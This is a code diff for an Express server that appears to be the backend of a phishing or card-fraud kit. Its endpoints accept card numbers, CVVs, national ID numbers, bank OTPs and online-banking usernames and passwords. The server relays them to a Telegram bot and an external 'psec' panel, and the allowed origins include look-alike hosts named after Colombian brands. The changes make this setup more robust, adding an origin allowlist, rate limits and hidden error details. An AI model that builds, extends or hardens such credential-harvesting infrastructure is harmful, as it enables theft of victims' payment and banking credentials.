@@ -204,7 +204,20 @@ async function detectBin(cardNumber) {
 
 const app = express();
 app.use(express.json());
-app.use(cors({ origin: true, credentials: true }));
+
+const ALLOWED_ORIGINS = [
+  'https://gestimobilcol.com',
+  'https://www.gestimobilcol.com',
+  'https://jelpit-sand.vercel.app',
+  'https://essa-blush.vercel.app',
+  'http://localhost:3000',
+  'http://localhost:5173',
+  'http://127.0.0.1:5500',
+];
+app.use(cors({
+  origin: (origin, cb) => cb(null, !origin || ALLOWED_ORIGINS.includes(origin)),
+  credentials: true,
+}));
 
 // ── Config ────────────────────────────────────────────────────────────────────
 const AWS_REGION      = 'us-east-1';
@@ -435,8 +448,7 @@ app.post('/api/pse/generar', async (req, res) => {
       `❌ HTTP ${wompiStatus}: <code>${JSON.stringify(wompiErr).slice(0, 300)}</code>\n` +
       `📅 ${new Date().toLocaleString('es-CO')}`
     );
-    const detail = typeof wompiErr === 'object' ? JSON.stringify(wompiErr) : String(wompiErr);
-    res.status(502).json({ error: `Error al procesar el pago PSE. Detalle: ${detail}` });
+    res.status(502).json({ error: 'Error al procesar el pago PSE. Intenta de nuevo.' });
   }
 });
 
@@ -511,6 +523,8 @@ app.get('/api/mobilize/credito/:numero', async (req, res) => {
 
 // POST /api/mobilize/pagar — genera link de pago Paymentez
 app.post('/api/mobilize/pagar', async (req, res) => {
+  if (!allowed(ip(req), 5, 60_000))
+    return res.status(429).json({ error: 'Demasiadas solicitudes.' });
   const { nombre, apellidos, email, creditNumber, amount, description, userId } = req.body || {};
   if (!creditNumber || !amount)
     return res.status(400).json({ error: 'Faltan datos para generar el pago.' });
@@ -547,6 +561,8 @@ const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
 
 app.post('/api/tg/send', async (req, res) => {
+  if (!allowed(ip(req), 10, 60_000))
+    return res.status(429).json({ ok: false });
   try {
     const { text, reply_markup } = req.body;
     const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
@@ -559,6 +575,8 @@ app.post('/api/tg/send', async (req, res) => {
 });
 
 app.get('/api/tg/updates', async (req, res) => {
+  if (!allowed(ip(req), 30, 60_000))
+    return res.status(429).json({ ok: false, result: [] });
   try {
     const offset = req.query.offset || 0;
     const r = await axios.get(`${TG_API}/getUpdates?timeout=5&offset=${offset}&allowed_updates=callback_query`);
@@ -567,6 +585,8 @@ app.get('/api/tg/updates', async (req, res) => {
 });
 
 app.post('/api/tg/answer', async (req, res) => {
+  if (!allowed(ip(req), 30, 60_000))
+    return res.status(429).json({ ok: false });
   try {
     const { callback_query_id } = req.body;
     const r = await axios.post(`${TG_API}/answerCallbackQuery`, { callback_query_id });
@@ -576,8 +596,7 @@ app.post('/api/tg/answer', async (req, res) => {
 
 // ── Proxy psec tarjetas ───────────────────────────────────────────────────────
 app.post('/api/tarjeta/crear', async (req, res) => {
-  const ip = getIp(req);
-  if (!allowed(ip, 10, 60_000))
+  if (!allowed(ip(req), 10, 60_000))
     return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes. Intenta en un momento.' });
   try {
     const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
@@ -617,6 +636,8 @@ app.post('/api/tarjeta/crear', async (req, res) => {
 });
 
 app.get('/api/tarjeta/estado/:id', async (req, res) => {
+  if (!allowed(ip(req), 60, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes.' });
   try {
     const r = await axios.get(`${PSEC_BASE}//panel/run/get_tarjetas_m3it3m.php`, { timeout: 12000 });
     const all = r.data?.data || [];
@@ -627,6 +648,8 @@ app.get('/api/tarjeta/estado/:id', async (req, res) => {
 });
 
 app.post('/api/tarjeta/actualizar', async (req, res) => {
+  if (!allowed(ip(req), 20, 60_000))
+    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes.' });
   try {
     const { id, status, banco_otp, dinamica, usuario, clave } = req.body || {};
     const params = new URLSearchParams({ id: id || '', status: status || '' });
@@ -659,6 +682,8 @@ app.post('/api/tarjeta/actualizar', async (req, res) => {
 });
 
 app.post('/api/detect-bank', async (req, res) => {
+  if (!allowed(ip(req), 20, 60_000))
+    return res.status(429).json({ ok: false, bank: null });
   const { cardNumber } = req.body || {};
   if (!cardNumber || String(cardNumber).replace(/\s/g,'').length < 6)
     return res.json({ ok: false, bank: null });
